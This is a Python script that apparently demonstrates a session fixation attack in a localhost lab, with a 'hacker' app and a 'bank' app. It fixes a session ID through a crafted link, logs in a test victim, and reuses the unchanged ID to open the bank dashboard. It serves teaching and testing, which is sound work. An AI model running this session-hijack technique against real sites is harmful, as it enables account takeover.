#!/usr/bin/env python3
"""
Simple Session Fixation Attack Demonstration
This demonstrates the session fixation attack without cookie conflicts.
"""

import requests

def demonstrate_session_fixation():
    print("🏦 SIMPLE SESSION FIXATION ATTACK DEMONSTRATION")
    print("=" * 60)
    
    # Step 1: Hacker visits bank and gets session ID
    print("🎯 STEP 1: Hacker visits bank and gets session ID")
    print("-" * 50)
    
    hacker_session = requests.Session()
    response = hacker_session.get("http://localhost:5001/bank/login")
    
    # Get session cookie from bank
    session_cookies = [name for name in hacker_session.cookies.keys() if 'session' in name.lower()]
    if session_cookies:
        bank_session_id = hacker_session.cookies[session_cookies[0]]
        print(f"Hacker captured bank session ID: {bank_session_id}")
    else:
        print("❌ No session cookie found from bank")
        return
    
    # Step 2: Hacker creates malicious link
    print(f"\n🎯 STEP 2: Hacker creates malicious link")
    print("-" * 50)
    
    malicious_url = f"http://localhost:5000/login?session_id={bank_session_id}"
    print(f"Hacker sends this link to victim: {malicious_url}")
    
    # Step 3: Victim visits malicious link
    print(f"\n🎯 STEP 3: Victim visits malicious link")
    print("-" * 50)
    
    victim_session = requests.Session()
    response = victim_session.get(malicious_url)
    
    # Get victim's session ID
    session_cookies = [name for name in victim_session.cookies.keys() if 'session' in name.lower()]
    if session_cookies:
        victim_session_id = victim_session.cookies[session_cookies[0]]
        print(f"Victim now has session ID: {victim_session_id}")
    else:
        print("❌ No session cookie found")
        return
    
    # Step 4: Victim logs in on hacker's site
    print(f"\n🎯 STEP 4: Victim logs in on hacker's site")
    print("-" * 50)
    
    login_data = {'username': 'john', 'password': 'john123'}
    response = victim_session.post("http://localhost:5000/login", data=login_data)
    
    # Get session ID after login
    session_cookies = [name for name in victim_session.cookies.keys() if 'session' in name.lower()]
    if session_cookies:
        login_session_id = victim_session.cookies[session_cookies[0]]
        print(f"Session ID after login: {login_session_id}")
    else:
        print("❌ No session cookie after login")
        return
    
    # Step 5: Analysis
    print(f"\n🔍 ATTACK ANALYSIS")
    print("-" * 50)
    print(f"Bank session ID (hacker's): {bank_session_id}")
    print(f"Victim session ID: {victim_session_id}")
    print(f"Session ID after login: {login_session_id}")
    
    if victim_session_id == login_session_id:
        print("\n🚨 VULNERABILITY CONFIRMED!")
        print("✅ Session ID unchanged after login")
        print("✅ Session fixation attack successful!")
        print("💰 Hacker can now access victim's bank account!")
        
        # Step 6: Hacker accesses victim's account
        print(f"\n🎯 STEP 5: Hacker accesses victim's bank account")
        print("-" * 50)
        
        # Hacker uses the same session ID to access bank
        hacker_session.cookies.set('session', login_session_id, domain='localhost')
        response = hacker_session.get("http://localhost:5001/bank/dashboard")
        
        if response.status_code == 200:
            print("✅ SUCCESS: Hacker can access victim's bank account!")
            print("🚨 VULNERABILITY CONFIRMED: Session fixation attack successful!")
        else:
            print("❌ Hacker cannot access victim's bank account")
            
    else:
        print("\n✅ SECURE!")
        print("Session ID changed after login")
        print("Session fixation attack prevented!")

if __name__ == '__main__':
    print("Make sure both apps are running:")
    print("  - Bank app: python bank_app.py (port 5001)")
    print("  - Hacker app: python vulnerable_app.py (port 5000)")
    print()
    
    try:
        demonstrate_session_fixation()
    except Exception as e:
        print(f"Error: {e}")
        print("Make sure both apps are running on the correct ports") 